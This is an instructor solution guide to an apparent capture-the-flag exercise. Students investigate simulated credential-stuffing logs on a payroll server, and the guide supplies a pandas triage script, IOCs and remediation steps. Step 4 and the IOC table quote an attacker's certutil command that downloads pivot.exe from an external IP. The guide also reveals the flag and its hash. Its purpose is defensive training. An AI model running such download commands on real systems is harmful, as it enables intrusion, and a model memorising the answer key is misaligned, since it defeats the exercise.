# 🛡️ Instructor Solution Guide: Incident 0101 (Operation NightShift)

### Off-Hours Authentication Triage & Credential Stuffing Forensics

---

## 📌 Executive Summary

| Parameter                           | Details                                                                                               |
| :---------------------------------- | :---------------------------------------------------------------------------------------------------- |
| **Incident ID**                     | `INC-0101-NIGHTSHIFT`                                                                                 |
| **Target Host**                     | `PAYROLL-SRV01` (Windows Server 2022)                                                                 |
| **Threat Classification**           | TLP:AMBER \| Severity: **HIGH**                                                                       |
| **Primary MITRE ATT&CK Techniques** | **T1110.001** (Password Guessing), **T1078.002** (Domain Accounts), **T1105** (Ingress Tool Transfer) |
| **Compromised Account**             | `admin_finance`                                                                                       |
| **Breach Timestamp**                | `2026-09-10 03:14:22 UTC`                                                                             |
| **Attacker Source IP**              | `198.51.100.42`                                                                                       |
| **Recovered Incident Flag**         | `FLAG{brute_force_pivot_admin_2026}`                                                                  |

At 03:14 UTC on September 10, 2026, the Security Operations Center (SOC) detected a severe surge in failed authentication events targeting `PAYROLL-SRV01`, immediately followed by a successful interactive NTLM logon to the privileged domain account `admin_finance`. Within 45 seconds of initial access, the adversary utilized Windows Living-off-the-Land binary `certutil.exe` to stage an ingress tool transfer (`pivot.exe`) containing the containment flag.

---

## 🎯 Investigation Methodology: Step-by-Step

Follow these sequential steps in the interactive Marimo notebook or in your investigation environment:

### Step 1: Ingest & Scope the Raw Authentication Telemetry

1. **Open the Notebook**: In the Marimo workspace, observe the top KPI cards:
   - **Total Events Audited**: `1,073`
   - **Authentication Failures (Event ID 4625)**: `204+`
   - **Successful Logons (Event ID 4624)**: `800+`
   - **Distinct Source IPs**: `18`
2. **Filter by Logon Status**:
   - In **Step 1: Raw Security Event Log Telemetry**, select the `Logon Status:` dropdown and change it from `ALL` to `FAILURE`.
   - Observe that `Event ID 4625` records populate the table, indicating failed logon attempts against various administrative accounts.
3. **Filter by Target User**:
   - In the `Target User:` search box, type `admin`.
   - Notice multiple failures targeting `admin_backup`, `admin_db`, `admin_sys`, and `admin_finance`. This behavior matches automated password spraying or credential stuffing.

---

### Step 2: High-Frequency Failure Anomaly Triage

1. **Locate the Anomaly Pivot Table**: Scroll to **Step 2: High-Frequency Failure Anomaly Triage**.
2. **Tune the Anomaly Threshold**:
   - Set the `Min Failed Logons Threshold for Anomaly Detection` slider to `20`.
3. **Analyze the Aggregated Pivot**:
   - Notice the top entry in the pivot table:
     - **Source IP**: `198.51.100.42` (External WAN IP)
     - **Failed Attempts**: `204`
     - **Targeted Users**: `['admin_backup', 'admin_db', 'admin_finance', 'admin_sys', 'administrator', 'svc_payroll']`
     - **First Attempt**: `2026-09-10 01:12:05 UTC`
     - **Last Attempt**: `2026-09-10 03:13:58 UTC`
   - _Key Analyst Insight_: While internal IP addresses have 1–3 intermittent failures, `198.51.100.42` generated 204 sustained failures over a 2-hour window. This isolates `198.51.100.42` as the adversary's staging host.

---

### Step 3: Reconstruct the Chronological Attack Timeline

1. **Select the Anomalous IP in Step 3**:
   - In **Step 3: Chronological Attack Timeline Analysis**, click the `Select Source IP to Trace Timeline:` dropdown and choose `198.51.100.42` (identified from the anomaly triage in Step 2).
2. **Identify the Breach Point**:
   - Notice the prominent red breach alert banner that appears:
     > 🚨 **BREACH DETECTED**: Source IP `198.51.100.42` obtained **1 successful logon(s)** after repeated failures!
     > - **Compromised Account**: `admin_finance`
     > - **Breach Timestamp**: `2026-09-10 03:14:22 UTC`
     > - **Logon Event ID**: `4624` (Logon Success)
   - The adversary systematically rotated through user credential dictionaries until hitting valid credentials for `admin_finance`.
   - **Authentication Package**: `NTLM`
   - **Target Host**: `PAYROLL-SRV01`

---

### Step 4: Process Execution & LOLBin Forensics

1. **Scroll to Step 4 (Living-off-the-Land Tool Retrieval)**:
   - After establishing an interactive session, the adversary spawned command shells under the `admin_finance` security context.
2. **Review the Captured Process Cards**:
   - **Card 1: Reconnaissance**:
     - **Process**: `cmd.exe`
     - **Command**: `whoami /all`
     - **Purpose**: Verify privileges and group memberships (Account Reconnaissance - T1087).
   - **Card 2: Ingress Tool Transfer (LOLBin)**:
     - **Process**: `certutil.exe`
     - **Timestamp**: `2026-09-10 03:15:07 UTC`
     - **Command**:
       ```bat
       certutil -urlcache -split -f http://198.51.100.42/pivot.exe FLAG{brute_force_pivot_admin_2026}
       ```
3. **Interpret the LOLBin Technique**:
   - `certutil.exe` is a legitimate Windows utility designed for managing certificates. Adversaries abuse the `-urlcache -split -f` parameters to download malicious payloads directly over HTTP/HTTPS, bypassing default application controls and browser download restrictions.
   - The flag was passed as an embedded tracking argument in the command line: `FLAG{brute_force_pivot_admin_2026}`.

---

### Step 5: Flag Verification & Submission

1. **Verify the Flag in the Notebook**:
   - In **Step 5: Verify Incident Flag & IOC Report**, paste `FLAG{brute_force_pivot_admin_2026}` into the text box.
   - The workbench validates the candidate flag using one-way cryptographic SHA-256 verification (`3422238b011b622ac8dfe184eef91461c0dd7728771aa7e343915790c26e87a8`), ensuring no plaintext answers can be inspected in the notebook code.
   - Confirm the green verification card: `🎉 FLAG VERIFIED CORRECT!`.
   - Upon correct verification, the confirmed **Threat Intelligence Indicators of Compromise (IOCs)** report unlocks below the input.
2. **Submit to Portal**:
   - Copy `FLAG{brute_force_pivot_admin_2026}` into the CyberLab challenge submission pane in the left portal to claim your 100 points and register your SOC competency.

---

## 🐍 Standalone Python Forensics Script

To reproduce this investigation programmatically outside of Marimo:

```python
import json
from pathlib import Path
import pandas as pd

# Load dataset
data_path = Path("data/auth_events.json")
with open(data_path) as f:
    events = json.load(f)

df = pd.DataFrame(events)
df["timestamp"] = pd.to_datetime(df["timestamp"])

# 1. Identify top failure source IP
failures = df[df["status"] == "FAILURE"]
top_attacker_ip = failures["source_ip"].value_counts().index[0]
print(f"[+] Top Malicious IP: {top_attacker_ip} ({failures['source_ip'].value_counts().iloc[0]} failures)")

# 2. Check for successful logins from attacker IP
attacker_success = df[(df["source_ip"] == top_attacker_ip) & (df["status"] == "SUCCESS")]
for _, row in attacker_success.iterrows():
    print(f"[!] Breach Confirmed: User '{row['target_user']}' breached at {row['timestamp']}")

# 3. Extract suspicious commands executed
cmd_events = df[(df["source_ip"] == top_attacker_ip) & (df["command_line"].notna())]
for _, row in cmd_events.iterrows():
    print(f"[>] Executed: {row['process_name']} -> {row['command_line']}")
```

---

## 📋 Indicators of Compromise (IOCs)

| Indicator Type          | Value                              | Context                                            |
| :---------------------- | :--------------------------------- | :------------------------------------------------- |
| **Attacker IPv4**       | `198.51.100.42`                    | External source of brute-force and C2 staging      |
| **Compromised Account** | `admin_finance`                    | Domain administrative credential breached via NTLM |
| **Attacker Binary URL** | `http://198.51.100.42/pivot.exe`   | Second-stage lateral movement payload              |
| **LOLBin Invocation**   | `certutil.exe -urlcache -split -f` | Ingress tool transfer mechanism                    |
| **Breach Timestamp**    | `2026-09-10 03:14:22 UTC`          | Initial interactive logon                          |

---

## 🛡️ Remediation & Incident Response Playbook

1. **Immediate Host Containment**:
   - Isolate `PAYROLL-SRV01` from the corporate network to prevent lateral movement.
2. **Account Revocation & Invalidation**:
   - Force reset password for `admin_finance` and invalidate all active Kerberos TGT tickets and NTLM sessions (`Revoke-AzureADUserAllRefreshToken` / Active Directory session reset).
3. **Firewall Blocking**:
   - Place `198.51.100.42` onto edge perimeter firewall droplists.
4. **Artifact Cleanup**:
   - Delete any downloaded artifacts (`pivot.exe`) from `C:\Windows\System32\` and clear the certutil cache:
     ```cmd
     certutil -urlcache * delete
     ```
5. **Hardening**:
   - Enforce Multi-Factor Authentication (MFA) on all interactive and remote administrative logons.
   - Implement Account Lockout thresholds (e.g., 5 failed attempts locks account for 30 minutes) to mitigate automated password spraying.
